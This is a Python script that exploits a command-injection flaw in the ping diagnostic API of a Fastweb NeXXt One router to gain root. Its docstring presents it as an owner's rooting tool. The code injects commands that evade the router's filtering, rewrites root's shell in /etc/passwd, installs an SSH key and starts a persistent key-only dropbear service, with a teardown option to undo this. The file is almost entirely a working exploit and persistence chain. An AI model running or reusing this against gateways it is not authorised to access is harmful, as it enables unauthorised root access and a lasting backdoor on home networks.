#!/usr/bin/env python3
"""Bootstrap, inspect and tear down a key-only SSH service on a Fastweb
NeXXt One (FGA221D / GDNT-S) gateway that YOU own.

Subcommands:

  bootstrap   Install your RSA public key and start a persistent dropbear
              instance on the LAN (default port 2222, key-only auth).
  status      Show the dropbear instance state (config + listening port).
  teardown    Remove the instance and restore the original root shell.

How it works (see docs/root-guide.md for the full story):

  * The stock web UI has a ping diagnostic API vulnerable to command
    injection (runs as root). Authentication to that API requires the
    physical-button login (or a reused session cookie).
  * Injected commands run in a sandboxed network namespace, so all work is
    done through the filesystem and ubus: UCI + procd start the SSH service
    in the main namespace.
  * The backend strips '>' and silently drops some host strings, so the
    public key is transferred as url-safe base64 in small verified segments
    (see nexxt_transfer.py).

Requirements: Python 3.9+, stdlib only. Root's original shell
(/bin/restricted_shell) is backed up to /tmp/nx_passwd.bak before being
patched to /bin/ash, and restored by `teardown`.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import os
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from nexxt_session import NexxtClient  # noqa: E402
from nexxt_transfer import Injector  # noqa: E402

I = "${IFS}"
INSTANCE = "nx"


def check_pubkey(path: str) -> bytes:
    line = open(path).read().strip()
    algo = line.split()[0] if line.split() else ""
    if algo != "ssh-rsa":
        raise RuntimeError(
            f"public key must be RSA (found {algo!r}); the stock dropbear is "
            "2019.x and supports neither ed25519 nor ecdsa"
        )
    return (line + "\n").encode()


class NexxtSSH(Injector):
    """Injector with bootstrap/teardown helpers."""

    def backup_and_patch_shell(self) -> None:
        self.do(f"cp{I}-n{I}/etc/passwd{I}/tmp/nx_passwd.bak")
        if not self.ask(f"grep{I}-q{I}'^root:.*:/bin/ash'{I}/etc/passwd"):
            self.do("sed" + I + "-i" + I + "'s#^\\(root:.*:\\)[^:]*$#\\1/bin/ash#'" + I + "/etc/passwd")
            if not self.ask(f"grep{I}-q{I}'^root:.*:/bin/ash'{I}/etc/passwd"):
                raise RuntimeError("failed to patch root shell")

    def install_key(self, keydata: bytes) -> None:
        parts = self.push(keydata, "sshkey")
        # assemble in groups to keep commands short
        groups = [parts[i:i + 6] for i in range(0, len(parts), 6)]
        temps = []
        for gi, g in enumerate(groups):
            tmp = f"/tmp/nxg_{gi}"
            self.do(f"cat{I}" + " ".join(g) + f"|tee{I}{tmp}")
            temps.append(tmp)
        self.do(f"cat{I}" + " ".join(temps)
                + f"|tr{I}'_-'{I}'/+'|base64{I}-d|tee{I}/etc/dropbear/authorized_keys")
        time.sleep(0.5)
        want = hashlib.md5(keydata).hexdigest()
        if not self.ask(f"md5sum{I}/etc/dropbear/authorized_keys|grep{I}-q{I}{want}"):
            raise RuntimeError("authorized_keys md5 mismatch after transfer")
        self.do(f"cp{I}/etc/dropbear/authorized_keys{I}/root/.ssh/authorized_keys")
        self.do(f"chmod{I}600{I}/etc/dropbear/authorized_keys{I}/root/.ssh/authorized_keys")
        self.do(f"chmod{I}700{I}/root/.ssh")
        self.do(f"rm{I}-f{I}/tmp/nxg_*{I}/tmp/nxseg_sshkey_*")

    def create_instance(self, port: int) -> None:
        if self.ask(f"uci{I}-q{I}show{I}dropbear.{INSTANCE}"):
            print(f"[ssh] uci instance {INSTANCE!r} already exists, reusing", flush=True)
        else:
            self.do(f"uci{I}add{I}dropbear{I}dropbear")
            self.do(f"uci{I}rename{I}dropbear.@dropbear[-1]={INSTANCE}")
        self.do(f"uci{I}set{I}dropbear.{INSTANCE}.enable=1")
        self.do(f"uci{I}set{I}dropbear.{INSTANCE}.Port={port}")
        self.do(f"uci{I}set{I}dropbear.{INSTANCE}.Interface=lan")
        self.do(f"uci{I}set{I}dropbear.{INSTANCE}.PasswordAuth=off")
        self.do(f"uci{I}set{I}dropbear.{INSTANCE}.RootPasswordAuth=off")
        self.do(f"uci{I}commit{I}dropbear")
        self.do(f"/etc/init.d/dropbear{I}restart")
        time.sleep(2)
        if not self.ask(f"netstat{I}-tln|grep{I}-q{I}:{port}"):
            raise RuntimeError(f"dropbear not listening on port {port}")

    def teardown(self, port: int) -> None:
        if self.ask(f"uci{I}-q{I}show{I}dropbear.{INSTANCE}"):
            self.do(f"uci{I}delete{I}dropbear.{INSTANCE}")
            self.do(f"uci{I}commit{I}dropbear")
        self.do(f"/etc/init.d/dropbear{I}restart")
        if self.ask(f"test{I}-f{I}/tmp/nx_passwd.bak"):
            self.do(f"cp{I}/tmp/nx_passwd.bak{I}/etc/passwd")
        self.do(f"rm{I}-f{I}/etc/dropbear/authorized_keys{I}/root/.ssh/authorized_keys")
        time.sleep(2)
        still = self.ask(f"netstat{I}-tln|grep{I}-q{I}:{port}")
        print(f"[teardown] instance removed, root shell restored, "
              f"port {port} {'STILL LISTENING (check manually!)' if still else 'closed'}")


def cmd_bootstrap(args: argparse.Namespace) -> int:
    keydata = check_pubkey(args.pubkey)
    inj = NexxtSSH()
    print(f"[ssh] baseline {inj.base:.1f}s", flush=True)
    inj.backup_and_patch_shell()
    print("[ssh] root shell ready", flush=True)
    inj.install_key(keydata)
    print("[ssh] public key installed (md5 verified)", flush=True)
    inj.create_instance(args.port)
    host = args.base_url.split("://", 1)[-1].split(":")[0].split("/")[0]
    print(f"\n[ssh] DONE. Connect with:")
    print(f"  ssh -i <private_key> -p {args.port} "
          f"-o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa root@{host}")
    return 0


def cmd_status(args: argparse.Namespace) -> int:
    inj = NexxtSSH()
    up = inj.ask(f"netstat{I}-tln|grep{I}-q{I}:{args.port}")
    cfg = inj.ask(f"uci{I}-q{I}show{I}dropbear.{INSTANCE}")
    key = inj.ask(f"test{I}-s{I}/etc/dropbear/authorized_keys")
    print(f"port {args.port}: {'LISTENING' if up else 'closed'}\n"
          f"uci instance {INSTANCE!r}: {'present' if cfg else 'absent'}\n"
          f"authorized_keys: {'present' if key else 'absent'}")
    return 0 if up else 1


def cmd_teardown(args: argparse.Namespace) -> int:
    inj = NexxtSSH()
    inj.teardown(args.port)
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--base-url", default="https://192.168.1.254",
                        help="gateway web UI URL (default %(default)s)")
    sub = parser.add_subparsers(dest="command", required=True)
    p_boot = sub.add_parser("bootstrap", help="install key and start persistent SSH")
    p_boot.add_argument("--pubkey", required=True, help="path to your RSA public key")
    p_boot.add_argument("--port", type=int, default=2222)
    p_stat = sub.add_parser("status", help="show SSH service state")
    p_stat.add_argument("--port", type=int, default=2222)
    p_down = sub.add_parser("teardown", help="remove SSH service and restore root shell")
    p_down.add_argument("--port", type=int, default=2222)
    args = parser.parse_args()

    # Injector binds its own client; rebind to custom base URL if given.
    orig = NexxtSSH.__init__

    def patched(self, *a, **kw):
        orig(self, *a, **kw)
        self.client = NexxtClient(args.base_url, timeout=10.0)
        if not self.client.is_authenticated():
            raise RuntimeError("not authenticated; run nexxt_session.py login "
                               "or import a session cookie first")
    NexxtSSH.__init__ = patched
    try:
        if args.command == "bootstrap":
            return cmd_bootstrap(args)
        if args.command == "status":
            return cmd_status(args)
        if args.command == "teardown":
            return cmd_teardown(args)
    finally:
        NexxtSSH.__init__ = orig
    return 2


if __name__ == "__main__":
    sys.exit(main())
